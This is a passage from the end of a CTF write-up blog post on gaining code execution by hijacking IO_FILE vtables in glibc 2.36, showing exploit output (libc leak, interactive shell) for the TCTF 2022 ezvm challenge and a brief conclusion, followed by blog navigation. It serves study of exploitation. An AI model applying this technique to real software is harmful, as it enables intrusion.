0x3f3dbf819ce0</span><br><span class="line">[*] leak data: 0x7f3dbf819ce0</span><br><span class="line">[+] leak: 0x7f3dbf819ce0</span><br><span class="line">[+] libcbase: 0x7f3dbf600000</span><br><span class="line">[*] writing to stderr</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">finish!</span><br><span class="line">continue?</span><br><span class="line"><span class="meta">$</span><span class="bash"> a</span></span><br><span class="line">Please input your code size:</span><br><span class="line"><span class="meta">$</span><span class="bash"> a</span></span><br><span class="line">Please input your memory count:</span><br><span class="line"><span class="meta">$</span><span class="bash"> a</span></span><br><span class="line">Please input your code:</span><br><span class="line">Wrong length!</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> pwn</span></span><br><span class="line">pwn</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Conclusion">Conclusion</h2>
<p>With this method we can gain arbitrary code execution without constructing any complex structure but only two arbitrary writing and libc address leaking. One of the most obvious drawbacks(in my opinion) is that we almost can’t control any registers which are used to pass arguments, thus we can only jump to one gadget to get shell here.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">KpwnZ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://kpwnz.github.io/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/">https://kpwnz.github.io/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnerability/">Vulnerability</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://source.unsplash.com/featured/?landscape,tech,life" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/03/Analyze-CVE-2022-32792-Faster-Than-Light-but-at-What-Cost/"><img class="prev-cover" src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Analyze CVE-2022-32792: Faster Than Light, but at What Cost?</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/26/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x0/"><img class="next-cover" src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0]</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/" title="CVE-2020-11102: Escape from the Earth"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-25</div><div class="title">CVE-2020-11102: Escape from the Earth</div></div></a></div><div><a href="/2022/09/26/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x0/" title="Code Execution by Faking IO_FILE->vtable in GLIBC 2.36 [0x0]"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-26</div><div class="title">Code Execution by Faking IO_FILE->vtable in GLIBC 2.36 [0x0]</div></div></a></div><div><a href="/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/" title="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-23</div><div class="title">From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</div></div></a></div><div><a href="/2022/10/03/Analyze-CVE-2022-32792-Faster-Than-Light-but-at-What-Cost/" title="Analyze CVE-2022-32792: Faster Than Light, but at What Cost?"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-03</div><div class="title">Analyze CVE-2022-32792: Faster Than Light, but at What Cost?</div></div></a></div><div><a href="/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/" title="CVE-2022-46702: Remember to Clean Up the Memory"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-22</div><div class="title">CVE-2022-46702: Remember to Clean Up the Memory</div></div></a></div><div><a href="/2022/10/29/evilCallback-CVE-2021-21225/" title="evilCallback: CVE-2021-21225"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-29</div><div class="title">evilCallback: CVE-2021-21225</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/22996989?s=400&amp;u=470b81ce0dd0fd2e15880f564e1bef0ba9655225&amp;v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">KpwnZ</div><div class="author-info__description">~ shit post ~</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">19</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/KpwnZ"><i class="fab fa-github"></i><span>GitHub</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#invalid-vtable"><span class="toc-number">1.1.</span> <span class="toc-text">invalid vtable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCTF-2022-ezvm"><span class="toc-number">1.2.</span> <span class="toc-text">TCTF 2022 ezvm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.3.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/09/Boot-Newer-iOS-with-QEMU-Step-by-Step/" title="Boot Newer iOS with QEMU Step by Step"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Boot Newer iOS with QEMU Step by Step"/></a><div class="content"><a class="title" href="/2024/03/09/Boot-Newer-iOS-with-QEMU-Step-by-Step/" title="Boot Newer iOS with QEMU Step by Step">Boot Newer iOS with QEMU Step by Step</a><time datetime="2024-03-09T18:30:27.000Z" title="Created 2024-03-09 10:30:27">2024-03-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/30/2023/" title="鼠鼠一事无成之2023"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="鼠鼠一事无成之2023"/></a><div class="content"><a class="title" href="/2023/12/30/2023/" title="鼠鼠一事无成之2023">鼠鼠一事无成之2023</a><time datetime="2023-12-31T06:15:03.000Z" title="Created 2023-12-30 22:15:03">2023-12-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/" title="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"/></a><div class="content"><a class="title" href="/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/" title="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF">From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</a><time datetime="2023-10-23T08:55:58.000Z" title="Created 2023-10-23 01:55:58">2023-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/08/SDCTF-2023-Writeup/" title="SDCTF 2023 Writeup"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SDCTF 2023 Writeup"/></a><div class="content"><a class="title" href="/2023/05/08/SDCTF-2023-Writeup/" title="SDCTF 2023 Writeup">SDCTF 2023 Writeup</a><time datetime="2023-05-08T19:41:03.000Z" title="Created 2023-05-08 12:41:03">2023-05-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/" title="CVE-2020-11102: Escape from the Earth"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2020-11102: Escape from the Earth"/></a><div class="content"><a class="title" href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/" title="CVE-2020-11102: Escape from the Earth">CVE-2020-11102: Escape from the Earth</a><time datetime="2023-04-25T07:50:54.000Z" title="Created 2023-04-25 00:50:54">2023-04-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By KpwnZ</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>